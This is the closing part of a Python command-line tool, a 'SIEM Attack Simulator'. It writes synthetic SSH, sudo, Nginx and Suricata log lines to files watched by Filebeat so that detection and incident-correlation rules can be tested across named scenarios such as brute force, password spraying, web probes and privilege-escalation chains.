    expect("Incident → Distributed Intrusion & Privilege Escalation  ← 3-stage unified incident")

    phase("Phase 1/3 — Attack  (distributed brute-force)")
    failure_lines = _build_auth_failed_multi_ip_lines(
        DIST_BF_ATTACKER_PREFIX, 5, user, ATTACK_START, ATTACK_END, fail_count
    )
    _write_phase(failure_lines, "failed_login [distributed]", log_file)

    phase("Phase 2/3 — Compromise  (success from clean IP)")
    success_line = _build_auth_success_line(USER_FAMILY_SUCCESS_IP, user, SUCCESS_AT)
    _write_phase([success_line], "success_login [clean-ip]", log_file)

    phase("Phase 3/3 — Privilege Escalation  (sudo failures from clean IP)")
    sudo_lines = _build_sudo_failed_lines(
        USER_FAMILY_SUCCESS_IP, user, PRIVESC_START, PRIVESC_END, sudo_count
    )
    _write_phase(sudo_lines, "sudo_failed [clean-ip]", log_file)

    print(f"\n  {GREEN}{BOLD}✔  Full 3-stage chain complete.  Filebeat will forward to Logstash → ES.{RESET}")


# ── Legacy aliases (backwards compatibility) ──────────────────────────────────

def _legacy_ssh_success_after_failures(ip, user, count, log_file):
    run_full_attack_chain(ip, user, count, log_file)

def _legacy_scenario_ssh_bruteforce_compromise(ip, user, count, log_file):
    run_full_attack_chain(ip, user, count, log_file)

def _legacy_scenario_password_spray_compromise(ip, count, log_file):
    run_password_spray_chain(ip, count, log_file)

def _legacy_scenario_targeted_account_compromise(user, count, log_file):
    run_targeted_account_chain(user, count, log_file)

def _legacy_scenario_distributed_account_compromise(user, count, log_file):
    run_distributed_attack_chain(user, count, log_file)

def _legacy_scenario_post_compromise_privesc(ip, user, fail_count, sudo_count, log_file):
    run_full_privesc_chain(ip, user, fail_count, sudo_count, log_file)

def _legacy_scenario_targeted_3stage(user, fail_count, sudo_count, log_file):
    run_targeted_privesc_chain(user, fail_count, sudo_count, log_file)

def _legacy_scenario_distributed_3stage(user, fail_count, sudo_count, log_file):
    run_distributed_privesc_chain(user, fail_count, sudo_count, log_file)


# ═══════════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════════

SCENARIOS = {
    # ── Pure attack-only (SSH/sudo) ───────────────────────────────────────────
    "ssh_bruteforce":          "Pure SSH brute-force from one IP  (no incident)",
    "password_spray":          "Password spray across many users  (no incident)",
    "user_bruteforce":         "Many IPs targeting one user       (no incident)",
    "distributed_bruteforce":  "Distributed IPs targeting one user (no incident)",
    "sudo_bruteforce":         "Sudo failures only                (no incident)",
    # ── Web attack-only  (v3.1) ───────────────────────────────────────────────
    "web_path_traversal":      "Path traversal attack simulation  (event.action: web_path_traversal_attempt)",
    "web_sql_injection":       "SQL injection attack simulation   (event.action: web_sql_injection_attempt)",
    "web_xss":                 "Cross-site scripting simulation   (event.action: web_xss_attempt)",
    "web_sensitive_file":      "Sensitive file probe simulation   (event.action: web_sensitive_file_probe)",
    "web_404_scanning":        "Web 404 scanning / enumeration    (event.action: web_404 → alert web_404_scanning → incident if alone)",
    # ── Network attack-only  (Suricata EVE JSON) ───────────────────────────────
    "network_port_scan":                  "Network port scan via Suricata flow events",
    "network_internal_sweep":             "Internal host sweep via Suricata flow events",
    "network_suspicious_outbound":        "Suspicious outbound connection via Suricata flow event",
    "network_c2_beaconing":               "Possible C2 beaconing via repeated Suricata flow events",
    "network_suspicious_dns":             "Suspicious DNS activity via Suricata DNS events",
    "network_recon_combo":                "Network port scan + internal sweep correlation test",
    "network_dns_outbound_combo":         "Suspicious DNS + outbound correlation test",
    "network_outbound_beacon_combo":      "Suspicious outbound + C2 beaconing correlation test",
    "network_port_scan_repeat":           "Network port scan repeat cooldown test",
    "network_suspicious_outbound_repeat": "Suspicious outbound repeat cooldown/promotion test",
    # ── Pure success-only ─────────────────────────────────────────────────────
    "ssh_success_only":        "Clean SSH successes only          (no alert)",
    "sudo_success_only":       "Clean sudo successes only         (no alert)",
    # ── 2-stage compound ─────────────────────────────────────────────────────
    "full_attack_chain":             "SSH BF → Compromise",
    "password_spray_chain":          "Password Spray → Compromise",
    "targeted_account_chain":        "User BF → Compromise",
    "distributed_attack_chain":      "Distributed BF → Compromise",
    # ── 3-stage compound ─────────────────────────────────────────────────────
    "full_privesc_chain":            "SSH BF → Compromise → Privesc  ★ full 3-stage",
    "targeted_privesc_chain":        "User BF → Compromise → Privesc  ★ full 3-stage",
    "distributed_privesc_chain":     "Distributed BF → Compromise → Privesc  ★ full 3-stage",
    # ── Legacy aliases ────────────────────────────────────────────────────────
    "ssh_success_after_failures":               "(legacy) → full_attack_chain",
    "scenario_ssh_bruteforce_compromise":       "(legacy) → full_attack_chain",
    "scenario_password_spray_compromise":       "(legacy) → password_spray_chain",
    "scenario_targeted_account_compromise":     "(legacy) → targeted_account_chain",
    "scenario_distributed_account_compromise":  "(legacy) → distributed_attack_chain",
    "scenario_post_compromise_privesc":         "(legacy) → full_privesc_chain",
    "scenario_targeted_3stage":                 "(legacy) → targeted_privesc_chain",
    "scenario_distributed_3stage":              "(legacy) → distributed_privesc_chain",
}


def _print_help_scenarios() -> None:
    print(f"\n{BOLD}Available --scenario values:{RESET}\n")
    sections = [
        ("Pure attack-only  — SSH/sudo  (no incident expected)",
         ["ssh_bruteforce","password_spray","user_bruteforce",
          "distributed_bruteforce","sudo_bruteforce"]),
        ("Pure attack-only  — Web  (v3.1 — incidents CREATED or UPDATED by incident_engine)",
         ["web_path_traversal","web_sql_injection","web_xss",
          "web_sensitive_file","web_404_scanning"]),
        ("Pure attack-only  — Network  (Suricata EVE JSON)",
         ["network_port_scan","network_internal_sweep","network_suspicious_outbound",
          "network_c2_beaconing","network_suspicious_dns"]),
        ("Network combo / cooldown scenarios",
         ["network_recon_combo","network_dns_outbound_combo","network_outbound_beacon_combo",
          "network_port_scan_repeat","network_suspicious_outbound_repeat"]),
        ("Pure success-only  (negative tests)",
         ["ssh_success_only","sudo_success_only"]),
        ("2-stage compound  (incident expected)",
         ["full_attack_chain","password_spray_chain",
          "targeted_account_chain","distributed_attack_chain"]),
        ("3-stage compound  (full 3-stage incident expected)",
         ["full_privesc_chain","targeted_privesc_chain","distributed_privesc_chain"]),
        ("Legacy aliases  (backwards compatibility)",
         ["ssh_success_after_failures","scenario_ssh_bruteforce_compromise",
          "scenario_password_spray_compromise","scenario_targeted_account_compromise",
          "scenario_distributed_account_compromise","scenario_post_compromise_privesc",
          "scenario_targeted_3stage","scenario_distributed_3stage"]),
    ]
    for title, keys in sections:
        print(f"  {CYAN}{BOLD}{title}{RESET}")
        for k in keys:
            print(f"    {GREEN}{k:<55}{RESET} {DIM}{SCENARIOS[k]}{RESET}")
        print()


def main() -> None:
    global SIMULATOR_HOSTNAME

    parser = argparse.ArgumentParser(
        description=(
            "SIEM Attack Simulator v3.1 — Filebeat/Logstash Edition\n"
            "Writes realistic Linux auth.log and Nginx access.log lines to files\n"
            "watched by Filebeat.  No database clients are used.\n\n"
            "SSH/sudo logs  → --log-file      (default: /var/log/auth.log)\n"
            "Web attack logs → --web-log-file  (default: /var/log/nginx/access.log)\n"
            "Network logs    → --network-log-file  (default: /var/log/suricata/eve.json)"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Run with --list-scenarios to see all available scenarios.",
    )
    parser.add_argument(
        "--scenario",
        choices=list(SCENARIOS.keys()),
        metavar="SCENARIO",
        help="Attack scenario to run  (use --list-scenarios for details)",
    )
    parser.add_argument("--list-scenarios", action="store_true",
                        help="Print all available scenarios and exit")
    parser.add_argument("--ip",         default=DEFAULT_IP,
                        help=f"Source IP for SSH/sudo scenarios  (default: {DEFAULT_IP})")
    parser.add_argument("--web-ip",     default=DEFAULT_WEB_IP,
                        help=f"Source IP for web attack scenarios  (default: {DEFAULT_WEB_IP})")
    parser.add_argument("--user",       default=DEFAULT_USER,
                        help=f"Target username  (default: {DEFAULT_USER})")
    parser.add_argument("--count",      type=int, default=6,
                        help="Number of failure/attack events  (default: 6)")
    parser.add_argument("--sudo-count", type=int, default=4,
                        help="Number of sudo failure events for 3-stage chains  (default: 4)")
    parser.add_argument(
        "--log-file",
        default=DEFAULT_LOG_FILE,
        help=(
            f"Path to the auth log file watched by Filebeat  "
            f"(default: {DEFAULT_LOG_FILE}  |  env: SIEM_LOG_FILE)"
        ),
    )
    parser.add_argument(
        "--web-log-file",
        default=DEFAULT_WEB_LOG_FILE,
        help=(
            f"Path to the Nginx access log file watched by Filebeat  "
            f"(default: {DEFAULT_WEB_LOG_FILE}  |  env: SIEM_WEB_LOG_FILE)"
        ),
    )
    parser.add_argument(
        "--network-log-file",
        default=DEFAULT_NETWORK_LOG_FILE,
        help=(
            f"Path to the Suricata EVE JSON file watched by Filebeat  "
            f"(default: {DEFAULT_NETWORK_LOG_FILE}  |  env: SIEM_NETWORK_LOG_FILE)"
        ),
    )
    parser.add_argument(
        "--hostname",
        default=SIMULATOR_HOSTNAME,
        help=(
            f"Hostname embedded in log lines  "
            f"(default: {SIMULATOR_HOSTNAME}  |  env: SIEM_HOSTNAME)"
        ),
    )

    args = parser.parse_args()

    SIMULATOR_HOSTNAME = args.hostname

    if args.list_scenarios:
        _print_help_scenarios()
        return

    if not args.scenario:
        parser.print_help()
        _print_help_scenarios()
        return

    print(f"\n{DIM}scenario={args.scenario}  ip={args.ip}  web-ip={args.web_ip}  "
          f"user={args.user}  count={args.count}  sudo-count={args.sudo_count}  "
          f"log-file={args.log_file}  web-log-file={args.web_log_file}  "
          f"network-log-file={args.network_log_file}  "
          f"hostname={SIMULATOR_HOSTNAME}{RESET}")

    s   = args.scenario
    lf  = args.log_file
    wlf = args.web_log_file
    nlf = args.network_log_file

    # ── Web attack-only  (v3.1) ───────────────────────────────────────────────
    if s == "web_path_traversal":
        run_web_path_traversal(args.web_ip, args.count, wlf)

    elif s == "web_sql_injection":
        run_web_sql_injection(args.web_ip, args.count, wlf)

    elif s == "web_xss":
        run_web_xss(args.web_ip, args.count, wlf)

    elif s == "web_sensitive_file":
        run_web_sensitive_file(args.web_ip, args.count, wlf)

    elif s == "web_404_scanning":
        run_web_404_scanning(args.web_ip, args.count, wlf)

    # ── Network attack-only  (Suricata EVE JSON) ──────────────────────────────
    elif s == "network_port_scan":
        run_network_port_scan(args.count, nlf)

    elif s == "network_internal_sweep":
        run_network_internal_sweep(args.count, nlf)

    elif s == "network_suspicious_outbound":
        run_network_suspicious_outbound(args.count, nlf)

    elif s == "network_c2_beaconing":
        run_network_c2_beaconing(args.count, nlf)

    elif s == "network_suspicious_dns":
        run_network_suspicious_dns(args.count, nlf)

    elif s == "network_recon_combo":
        run_network_recon_combo(args.count, nlf)

    elif s == "network_dns_outbound_combo":
        run_network_dns_outbound_combo(args.count, nlf)

    elif s == "network_outbound_beacon_combo":
        run_network_outbound_beacon_combo(args.count, nlf)

    elif s == "network_port_scan_repeat":
        run_network_port_scan_repeat(args.count, nlf)

    elif s == "network_suspicious_outbound_repeat":
        run_network_suspicious_outbound_repeat(args.count, nlf)

    # ── Pure attack-only (SSH/sudo) ───────────────────────────────────────────
    elif s == "ssh_bruteforce":
        run_ssh_bruteforce(args.ip, args.user, args.count, lf)
    elif s == "password_spray":
        run_password_spray(args.ip, args.count, lf)
    elif s == "user_bruteforce":
        run_user_bruteforce(args.user, args.count, lf)
    elif s == "distributed_bruteforce":
        run_distributed_bruteforce(args.user, args.count, lf)
    elif s == "sudo_bruteforce":
        run_sudo_bruteforce(args.ip, args.user, args.count, lf)

    # ── Pure success-only ─────────────────────────────────────────────────────
    elif s == "ssh_success_only":
        run_ssh_success_only(args.ip, args.user, args.count, lf)
    elif s == "sudo_success_only":
        run_sudo_success_only(args.ip, args.user, args.count, lf)

    # ── 2-stage compound ──────────────────────────────────────────────────────
    elif s in ("full_attack_chain",
               "ssh_success_after_failures",
               "scenario_ssh_bruteforce_compromise"):
        run_full_attack_chain(args.ip, args.user, args.count, lf)

    elif s in ("password_spray_chain",
               "scenario_password_spray_compromise"):
        run_password_spray_chain(args.ip, args.count, lf)

    elif s in ("targeted_account_chain",
               "scenario_targeted_account_compromise"):
        run_targeted_account_chain(args.user, args.count, lf)

    elif s in ("distributed_attack_chain",
               "scenario_distributed_account_compromise"):
        run_distributed_attack_chain(args.user, args.count, lf)

    # ── 3-stage compound ──────────────────────────────────────────────────────
    elif s in ("full_privesc_chain",
               "scenario_post_compromise_privesc"):
        run_full_privesc_chain(args.ip, args.user, args.count, args.sudo_count, lf)

    elif s in ("targeted_privesc_chain",
               "scenario_targeted_3stage"):
        run_targeted_privesc_chain(args.user, args.count, args.sudo_count, lf)

    elif s in ("distributed_privesc_chain",
               "scenario_distributed_3stage"):
        run_distributed_privesc_chain(args.user, args.count, args.sudo_count, lf)


if __name__ == "__main__":
    main()